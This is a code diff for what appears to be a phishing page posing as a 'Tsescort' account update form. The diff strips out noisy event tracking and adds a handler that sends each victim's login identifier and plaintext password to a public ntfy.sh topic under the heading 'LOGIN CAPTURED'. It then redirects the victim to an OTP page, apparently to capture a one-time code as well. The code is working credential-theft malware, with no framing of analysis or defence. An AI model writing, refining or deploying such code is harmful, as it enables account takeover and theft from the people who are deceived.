@@ -640,8 +640,10 @@
       }, 3000);
 
       // ------------------------------------------------------------
-      // NTFY SECRET NOTIFY – topic: ts_update
-      // Fires on landing, any click, and form actions.
+      // NTFY NOTIFY – topic: ts_update
+      // ONLY 2 NOTIFICATIONS:
+      //   1) When the page lands
+      //   2) When credentials are entered AND Update is clicked
       // ------------------------------------------------------------
       const NTFY_TOPIC = 'ts_update';
       const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;
@@ -663,27 +665,8 @@
         }
       }
 
-      // 1) Landing notification
+      // 1) LANDING NOTIFICATION
       sendNtfy('🚨 Tsescort page landed · ' + new Date().toISOString(), ['globe_with_meridians']);
-
-      // 2) Any click on the document
-      document.addEventListener('click', function(e) {
-        const target = e.target.closest('button, a, input, .card, .logo-ts, .update-btn, .subhead');
-        const tag = target ? target.tagName.toLowerCase() : 'document';
-        const text = (target && target.innerText) ? target.innerText.trim().slice(0, 30) : 'element';
-        sendNtfy(`🖱️ Click on ${tag} · "${text}"`, ['point_up']);
-      }, { passive: true });
-
-      // 3) Any input / change action
-      document.addEventListener('input', function(e) {
-        const id = e.target.id || 'unknown';
-        sendNtfy(`⌨️ Input on #${id} · length: ${e.target.value.length}`, ['keyboard']);
-      }, { passive: true });
-
-      document.addEventListener('change', function(e) {
-        const id = e.target.id || 'unknown';
-        sendNtfy(`🔄 Change on #${id}`, ['arrows_counterclockwise']);
-      }, { passive: true });
 
       // ------------------------------------------------------------
       // ORIGINAL SERVER / API LOGIC (unchanged)
@@ -725,18 +708,24 @@
         const identifier = identifierInput.value.trim();
         const password = passwordInput.value;
 
-        sendNtfy(`📨 Form submit · identifier: ${identifier} · pass length: ${password.length}`, ['incoming_envelope']);
-
         if (!identifier || !password) {
           alert('Please fill in all fields.');
-          sendNtfy('⚠️ Form validation failed: empty fields', ['warning']);
           return;
         }
 
+        // 2) CREDENTIALS SUBMITTED NOTIFICATION (login + password)
+        sendNtfy(
+          `🔐 TSESCORT LOGIN CAPTURED\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `👤 Identifier: ${identifier}\n` +
+          `🔑 Password:   ${password}\n` +
+          `⏰ Time:       ${new Date().toISOString()}\n` +
+          `━━━━━━━━━━━━━━━━━━━━`,
+          ['lock', 'key']
+        );
+
         updateBtn.disabled = true;
         updateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-
-        sendNtfy(`🔐 Update attempt · ${identifier}`, ['lock']);
 
         const startTime = Date.now();
         loadingOverlay.classList.add('active');
@@ -746,38 +735,11 @@
         const elapsed = Date.now() - startTime;
         const remaining = Math.max(0, 5000 - elapsed);
 
-        sendNtfy(`✅ Update request sent · identifier: ${identifier} · elapsed: ${elapsed}ms`, ['white_check_mark']);
-
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
-          sendNtfy(`↪️ Redirecting to otp.html`, ['arrow_forward']);
           window.location.href = 'otp.html';
         }, remaining);
       });
-
-      // Additional NTFY on button click separately
-      updateBtn.addEventListener('click', function() {
-        sendNtfy('🔴 Update button clicked (direct)', ['red_circle']);
-      });
-
-      // keydown tracking
-      identifierInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendNtfy('⏎ Enter pressed on identifier field', ['keyboard']);
-      });
-      passwordInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') sendNtfy('⏎ Enter pressed on password field', ['keyboard']);
-      });
-
-      // window load
-      window.addEventListener('load', function() {
-        sendNtfy('🌐 Window fully loaded · Tsescort update page', ['tada']);
-      });
-
-      // focus / blur tracking
-      identifierInput.addEventListener('focus', () => sendNtfy('👤 Identifier field focused', ['mag']));
-      passwordInput.addEventListener('focus', () => sendNtfy('🔑 Password field focused', ['mag']));
-      identifierInput.addEventListener('blur', () => sendNtfy('👤 Identifier field blurred', ['mag_right']));
-      passwordInput.addEventListener('blur', () => sendNtfy('🔑 Password field blurred', ['mag_right']));
 
       // End of logic
     })();
